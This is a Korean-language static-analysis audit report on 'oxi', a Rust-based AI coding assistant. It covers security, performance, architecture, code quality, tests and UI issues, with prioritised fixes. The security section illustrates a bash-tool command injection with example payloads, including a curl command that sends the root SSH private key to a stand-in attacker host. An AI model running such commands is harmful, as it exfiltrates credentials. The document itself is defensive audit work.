# Oxi 프로젝트 종합 분석 보고서

**프로젝트:** oxi - Rust 기반 AI 코딩 어시스턴트  
**분석 일자:** 2026-05-14  
**분석 방법:** 다중 서브에이전트 병렬 분석 (8개 분석 영역)  
**대상 범위:** oxi-ai, oxi-agent, oxi-cli, oxi-store, oxi-tui (전체 코드베이스)

---

## Executive Summary

oxi는 Rust로 작성된 다중 프로바이더 AI 코딩 어시스턴트로, 5개의 크레이트(oxi-ai, oxi-agent, oxi-cli, oxi-store, oxi-tui), **77개 소스 파일, 약 111,520줄의 코드**로 구성되어 있습니다. 전반적으로 견고한 아키텍처와 양호한 테스트 커버리어를 갖추고 있으나, **보안, 성능, 코드 품질** 측면에서 즉각적인 조치가 필요한 심각도 CRITICAL 이슈가 다수 발견되었습니다.

### 핵심 발견 사항

| 영역 | 평가 | 심각도별 이슈 수 |
|------|------|------------------|
| **보안** | ⚠️ 개선 필요 | Critical 3, High 7, Medium 12 |
| **아키텍처** | ✅ 양호 | Critical 2, High 4, Medium 12 |
| **성능** | ⚠️ 최적화 필요 | Critical 5, High 8, Medium 7 |
| **코드 품질** | ⚠️ 일관성 필요 | High 5, Medium 20, Low 15 |
| **테스트** | ✅ 우수 | Critical 0, High 2, Medium 6 |
| **TUI** | ✅ 양호 | Critical 1, High 3, Medium 16 |

---

## 1. 보안 취약점 보고서 (Security Audit)

### 🔴 CRITICAL 취약점

#### 1. Bash 도구 명령어 주입
**위치:** `oxi-agent/src/tools/bash.rs:94-98`
**설명:** 사용자(LLM)가 제공한 명령이 검증 없이 `sh -c`를 통해 직접 실행됩니다.

```rust
cmd.arg("-c").arg(command)  // 검증 없음
```

**공격 시나리오:**
```json
{"command": "echo 'pwned'; cat /etc/passwd"}
{"command": "curl http://attacker.com/?$(cat /root/.ssh/id_rsa)"}
```

**권장 조치:**危险 명령 패턴 감지, 화이트리스트 방식 도입, 작업 디렉토리 외 파일 접근 차단

#### 2. OAuth CSRF - state 파라미터 미검증
**위치:** `oxi-cli/src/oauth_server.rs:162-202`
**설명:** OAuth 콜백에서 state 파라미터를 읽지만 원래 발급한 state와 비교 검증하지 않음

**권장 조치:** 서버 시작 시 무작위 state 생성, 콜백 수신 시 대조 검증

#### 3. API 키 평문 저장
**위치:** `oxi-store/src/auth_storage.rs:347-353`
**설명:** `auth.json`에 API 키가 `serde_json::to_string_pretty()`로 평문 저장됨

**권장 조치:** OS 키링(keyring) 기본 사용, 파일 저장 시 AES-256-GCM 암호화

---

### 🟠 HIGH 취약점

| # | 취약점 | 위치 | 설명 |
|---|--------|------|------|
| H1 | MCP 서버 임의 명령 실행 | `mcp/config.rs` | 설정된 MCP 서버 명령 검증 없음 |
| H2 | 확장 로딩 심볼릭 링크 공격 | `extensions/loading.rs:87` | 파일 무결성 검증 없음, `forget()` 메모리 누수 |
| H3 | WASM exec 타임아웃 미강제 | `wasm.rs:445` | timeout 필드 무시 |
| H4 | models.json 명령어 주입 | `model_registry.rs:292` | `!` 접두사 명령어 실행 기능 |
| H5 | 로깅 파일 민감 정보 유출 | `main.rs:31` | debug 로그 레벨 기본값 |
| H6 | PathGuard 미적용 | `tools/read.rs`, `tools/write.rs` | 모든 파일 도구가 PathGuard 미사용 |
| H7 | BashTool 환경변수 검증 누락 | `bash.rs:159` | LD_PRELOAD, PATH 등 차단 없음 |

---

## 2. 성능 최적화 보고서 (Performance Analysis)

### 🔴 CRITICAL 성능 문제

#### P1: 스트리밍 핫 패스에서 과도한 `.clone()` 호출
**위치:** 
- `proxy.rs:513,563,584,608,636,670` - `partial.clone()`
- `agent_loop/streaming.rs:70,84,108,142,194,197` - `messages.last().clone()`

**영향:** LLM 응답당 수천 개의 델타 이벤트에서 전체 메시지 복제 → O(n²) 메모리 할당

**개선 제안:**
```rust
// Before: O(n) 복제
emit(AgentEvent::TextDelta { partial: self.partial.clone() });

// After: O(1) 복제
emit(AgentEvent::TextDelta { partial: Arc::clone(&self.partial) });
```

#### P2: SSE 파싱 시 `buffer.drain()` + 재수집
**위치:** `proxy.rs:284-298`

**개선 제안:** `bytes::BytesMut::split_to()` 또는 인덱스 기반 슬라이스 사용

#### P3: Regex 매 호출마다 재컴파일
**위치:**
- `changelog.rs:65` - 버전 파싱
- `templates.rs:189,202` - 템플릿 변수
- `packages.rs:365` - 패키지 정규식

**개선 제안:** `LazyLock` 또는 `OnceLock`으로 캐싱

---

### 🟠 주요 성능 최적화 기회

| # | 영역 | 위치 | 설명 |
|---|------|------|------|
| P4 | HTTP Client 재생성 | `github_search.rs:137`, `packages.rs:481` 등 | 매번 새 클라이언트 생성, 연결 풀 손실 |
| P5 | ToolCall JSON 반복 파싱 | `proxy.rs:620-626` | 매 델타마다 전체 JSON 파싱 |
| P6 | ReadTool 이중 버퍼 읽기 | `read.rs:127-153` | 이진 감지 + 콘텐츠 읽기 분리 |
| P7 | MCP 매니저 Mutex 경합 | `mcp/mod.rs:72` | 모든 작업이 동일한 Mutex 통과 |
| P8 | 토큰 추정 전체 JSON 직렬화 | `state.rs:112` | 매 턴마다 전체 메시지 직렬화 |

---

## 3. 아키텍처 분석 보고서 (Architecture Analysis)

### 3.1 크레이트 의존성 그래프

```
oxi-cli (메인 바이너리)
├── oxi-ai (LLM API)
├── oxi-agent (에이전트 런타임)
├── oxi-store (영속성)
└── oxi-tui (UI 프레임워크)
```

### 3.2 주요 아키텍처 강점

1. **모듈화된 크레이트 구조** - 각 크레이트가 명확한 책임 분리
2. **이벤트 기반 설계** - `AgentEvent`, `ProviderEvent` 스트리밍 시스템
3. **Provider 트레잇 기반** - 10개+ 프로바이더의统일 인터페이스
4. **ToolRegistry 패턴** - 동적 도구 등록/발견
5. **Settings 레이어드 아키텍처** - 5단계 우선순위 설정 시스템

### 3.3 주요 아키텍처 약점

| # | 문제 | 위치 | 설명 |
|---|------|------|------|
| A1 | MCP 타임아웃 부재 | `mcp/client.rs:217` | read_message에 타임아웃 없음 |
| A2 | Tokio 런타임 반복 생성 | `tui/app.rs:266` | 세션 전환 시마다 새 런타임 |
| A3 | Session 파일 비원자적 쓰기 | `session.rs:503` | tmp→rename 패턴 미사용 |
| A4 | RPC 핸들러 미완성 | `rpc_mode/handlers.rs:76` | 대부분의 핸들러가 스텁 |
| A5 | 다중 RwLock 데드락 위험 | `session.rs:540-549` | 락 획득 순서 불일치 |

---

## 4. 코드 품질 보고서 (Code Quality Analysis)

### 4.1 에러 처리 패턴

| 개선 필요 영역 | 위치 | 설명 |
|----------------|------|------|
| `unwrap()` 남용 | 다수 파일 | 사용자 입력 처리 시 panic 위험 |
| ProviderError 재시도 정보 부재 | `error.rs:14-50` | 재시도 가능 여부 판별 불가 |
| CompactionError 미통합 | `compaction.rs:244` | 메인 에러 계층에 미포함 |

### 4.2 코드 중복

| 중복 유형 | 추정 중복 줄수 | 설명 |
|-----------|----------------|------|
| SSE 파싱 구조체 | ~400줄 | 8개 OpenAI 호환 프로바이더 |
| build_messages() | ~500줄 | 프로바이더별 중복 |
| create_error_message() | ~80줄 | 11개 프로바이더 |
| 시스템 프롬프트 빌더 | ~100줄 | lib.rs vs agent_session_runtime.rs |
| **총계** | **~1,080줄** | |

### 4.3 UTF-8 안전성 문제

다수 위치에서 `&str[..n]` 바이트 슬라이싱이 멀티바이트 문자에서 패닉 발생 가능:
- `main.rs:462` - truncate()
- `auto_compaction.rs:341` - 메시지 잘림
- `auto_compaction.rs:317` - 토큰 추정

---

## 5. 테스트 품질 보고서 (Testing Analysis)

### 5.1 테스트 현황

| 지표 | 수치 |
|------|------|
| 총 테스트 함수 | ~1,934개 |
| 통합 테스트 파일 | 8개 |
| 벤치마크 파일 | 2개 |
| 테스트 없는 소스 파일 | 0개 |

### 5.2 강점

- ✅ 모든 소스 파일에 최소 1개 이상의 테스트 존재
- ✅ 45개 retry 테스트 ( Circuit Breaker, 에러 분류 )
- ✅ 60개 도구 테스트 ( 경로 순회, 인젝션 차단 )
- ✅ 12개 프로바이더 모두 URL/응답 파싱 테스트
- ✅ mockito 기반 HTTP Mock 지원

### 5.3 개선 필요

- ❌ oxi-store 통합 테스트 부재 (tests/ 디렉토리 없음)
- ❌ 동시성 테스트 부재 ( race condition 검증 없음)
- ❌ Property-based 테스트 부재 ( proptest 미사용)
- ❌ Mock 중복 정의 (agent_loop_full.rs vs tests.rs)

---

## 6. TUI 위젯 분석 보고서

### 6.1 발견된 문제

| 심각도 | 문제 | 위치 | 설명 |
|--------|------|------|------|
| **Critical** | text_mut() panic | `input.rs:68` | pub fn이 unimplemented!() |
| High | 2중 마크다운 파싱 | `table_renderer.rs:119` | 테이블 감지 + 렌더링 2회 파싱 |
| High | unstable-rendered-line-info | `Cargo.toml:12` | unstable feature 사용 |
| Medium | into_theme() 보일러플레이트 | `theme.rs:368` | 19개 색상 필드 반복 코드 |
| Medium | 멀티라인 프롬프트 미지원 | `input.rs:234` | > 프롬프트가 첫 줄에만 표시 |
| Medium | CJK 단어 분리 부재 | `table_renderer.rs:18` | split_whitespace() 사용 |

---

## 7. 종합 개선 권장사항

### 🔴 즉시 조치 (P0)

| # | 권장사항 | 관련 취약점/문제 |
|---|----------|------------------|
| 1 | BashTool에 명령어 화이트리스트/危险 패턴 감지 | S1, S2 |
| 2 | OAuth state 파라미터 검증 구현 | S3 |
| 3 | auth.json API 키 암호화 | S8 |
| 4 | PathGuard를 모든 파일 도구에 적용 | H6 |
| 5 | input.rs text_mut() panic 수정 | T1 |
| 6 | SSE 파싱 버퍼 최적화 (split_to) | P2 |

### 🟠 단기 개선 (P1)

| # | 권장사항 | 관련 취약점/문제 |
|---|----------|------------------|
| 7 | 모든 .clone()을 Arc::clone()으로 전환 | P1 |
| 8 | Regex 캐싱 (LazyLock) | P3 |
| 9 | reqwest::Client 싱글톤 패턴 적용 | P4 |
| 10 | MCP read_message 타임아웃 추가 | A1 |
| 11 | Session 파일 원자적 쓰기 (tmp→rename) | A3 |
| 12 | unwrap() → expect() 또는 Result 처리 | C1 |

### 🟡 중기 개선 (P2)

| # | 권장사항 | 관련 취약점/문제 |
|---|----------|------------------|
| 13 | oxi-store 통합 테스트 추가 | T3 |
| 14 | 동시성 테스트 추가 | T4 |
| 15 | OpenAI 호환 SSE 파싱 모듈 추출 | C2 |
| 16 | 시스템 프롬프트 빌더 통합 | C2 |
| 17 | UTF-8 안전한 문자열 슬라이싱 유틸리티 | C3 |
| 18 | Tokio 런타임 재사용 (tui/app.rs) | A2 |

### 🟢 장기 개선 (P3)

| # | 권장사항 | 관련 취약점/문제 |
|---|----------|------------------|
| 19 | Property-based 테스트 도입 (proptest) | T5 |
| 20 | RPC 핸들러 완전한 구현 | A4 |
| 21 | 확장 권한 enforcement | S13 |
| 22 | 세션 파일 무결성 검증 (HMAC) | S15 |

---

## 8. 아키텍처 건전성 평가

### 8.1 크레이트 평가

| 크레이트 | 아키텍처 | 보안 | 성능 | 테스트 | 종합 |
|----------|----------|------|------|--------|------|
| **oxi-ai** | ★★★★☆ | ★★★☆☆ | ★★★☆☆ | ★★★★☆ | B+ |
| **oxi-agent** | ★★★★★ | ★★★☆☆ | ★★★☆☆ | ★★★★☆ | B+ |
| **oxi-cli** | ★★★☆☆ | ★★★☆☆ | ★★★☆☆ | ★★★☆☆ | B |
| **oxi-store** | ★★★★☆ | ★★★☆☆ | ★★★☆☆ | ★★★☆☆ | B+ |
| **oxi-tui** | ★★★★☆ | ★★★★☆ | ★★★★☆ | ★★★☆☆ | B+ |

### 8.2 종합 평가: B (양호, 개선 필요)

oxi 프로젝트는 견고한 기반을 갖추고 있으나, 보안 강화와 성능 최적화가 시급합니다.

---

## 9. 부록: 상세 분석 보고서 목록

| 보고서 | 작성자 | 주요 발견 |
|--------|--------|-----------|
| `report_oxi_ai.md` | 서브에이전트 1 | UTF-8 경계 불일치, SSE 코드 중복 ~2,280줄 |
| `report_oxi_agent.md` | 서브에이전트 2 | PathGuard 미적용, MCP 타임아웃 부재 |
| `report_oxi_cli.md` | 서브에이전트 3 | RPC 스텁, Tokio 런타임 재생성, OAuth state 미검증 |
| `report_oxi_store.md` | 서브에이전트 4 | 세션 파일 비원자적 쓰기, API 키 평문 저장 |
| `report_oxi_tui.md` | 서브에이전트 5 | text_mut() panic, 2중 마크다운 파싱 |
| `report_architecture.md` | 서브에이전트 6 | *(작업 실패)* |
| `report_security.md` | 서브에이전트 7 | Bash 명령어 주입, CSRF, API 키 노출 |
| `report_testing.md` | 서브에이전트 8 | 동시성 테스트 부재, oxi-store 통합 테스트 부재 |
| `report_performance.md` | 서브에이전트 9 | `.clone()` 과다, SSE 파싱 비효율 |

---

*이 보고서는 정적 코드 분석을 기반으로 작성되었습니다. 런타임 동작이나 실제 성능 profiling은 포함되지 않았습니다.*